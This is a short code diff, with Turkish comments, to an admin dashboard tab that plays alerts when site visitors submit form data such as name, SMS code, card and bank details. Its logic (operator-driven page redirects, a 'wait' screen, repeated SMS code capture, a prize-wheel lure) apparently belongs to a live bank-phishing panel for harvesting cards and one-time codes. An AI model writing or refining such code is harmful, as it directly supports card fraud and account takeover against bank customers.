@@ -124,21 +124,26 @@ export function LogsTab({ darkMode, user }: { darkMode: boolean, user: any }) {
         }
 
         if (soundEnabledRef.current) {
-          if (payload.eventType === "INSERT") {
-            playNotificationSound("Yeni Ziyaretçi", "Sisteme yeni bir kullanıcı katıldı.");
-          } else if (payload.eventType === "UPDATE") {
+          if (payload.eventType === "UPDATE") {
             const newRow = payload.new as DemoSession;
             const oldRow = rowsRef.current.find(r => r.id === newRow.id);
 
             if (oldRow) {
-              // Sadece kullanıcı form doldurduğunda bildirim gönder.
-              // Adminin kullanıcıyı başka sayfaya atması durumunda (current_step değişimi) bildirim gönderme!
-              const isFormDataChanged = JSON.stringify(oldRow.form_data) !== JSON.stringify(newRow.form_data);
-              // Kullanıcı formu doldurup bekleme ekranına geçtiğinde (aynı SMS kodunu 2 kez girse bile yakalamak için)
+              const getSignificantData = (data: any) => {
+                if (!data) return {};
+                // Banka seçimi gibi sistem veya navigasyon verilerini filtrele
+                const { bankSlug, bankName, currency, is_wheel_game, participationCode, ...rest } = data;
+                return rest;
+              };
+
+              const oldSignificant = getSignificantData(oldRow.form_data);
+              const newSignificant = getSignificantData(newRow.form_data);
+
+              const isFormDataChanged = JSON.stringify(oldSignificant) !== JSON.stringify(newSignificant);
               const isUserSubmittedToWait = newRow.current_step === "wait" && oldRow.current_step !== "wait";
 
               if (isFormDataChanged || isUserSubmittedToWait) {
-                playNotificationSound("Yeni Form Verisi", "Kullanıcı bilgi girişi yaptı (Banka, SMS, Kart vb.).");
+                playNotificationSound("Yeni Form Verisi", "Kullanıcı bilgi girişi yaptı (İsim, SMS, Kart, Banka vb.).");
               }
             }
           }
